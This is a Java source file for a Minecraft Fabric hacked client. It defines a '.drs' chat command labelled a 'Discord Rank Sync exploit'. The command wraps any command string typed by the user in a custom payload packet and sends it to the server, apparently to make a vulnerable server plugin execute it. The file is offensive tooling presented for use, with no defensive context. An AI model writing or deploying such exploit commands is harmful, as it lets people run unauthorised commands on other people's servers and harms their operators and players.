package io.github.spigotrce.paradiseclientfabric.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import io.github.spigotrce.paradiseclientfabric.Helper;
import net.minecraft.client.MinecraftClient;
import net.minecraft.command.CommandSource;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import io.github.spigotrce.paradiseclientfabric.packet.DiscordRankSyncPayloadPacket;

public class DiscordRankSync extends Command {
    private static final String USAGE_MESSAGE = "Usage: .drs <command>";
    private static final String SUCCESS_MESSAGE = "§aPayload sent successfully!";
    private static final String ERROR_MESSAGE = "§cFailed to send payload!";

    public DiscordRankSync(MinecraftClient minecraftClient) {
        super("drs", "Discord Rank Sync exploit", minecraftClient);
    }

    @Override
    public LiteralArgumentBuilder<CommandSource> build() {
        return LiteralArgumentBuilder.<CommandSource>literal(this.getName())
            .executes(this::showUsage)
            .then(argument("command", StringArgumentType.greedyString())
                .executes(this::executeCommand)
            );
    }

    private int showUsage(CommandContext<CommandSource> context) {
        Helper.printChatMessage(USAGE_MESSAGE);
        return 1;
    }

    private int executeCommand(CommandContext<CommandSource> context) {
        try {
            String command = context.getArgument("command", String.class);
            CustomPayloadC2SPacket packet = new CustomPayloadC2SPacket(
                new DiscordRankSyncPayloadPacket(command)
            );
            Helper.sendPacket(packet);
            Helper.printChatMessage(SUCCESS_MESSAGE);
            return 1;
        } catch (Exception e) {
            Helper.printChatMessage(ERROR_MESSAGE);
            e.printStackTrace();
            return -1;
        }
    }
          }
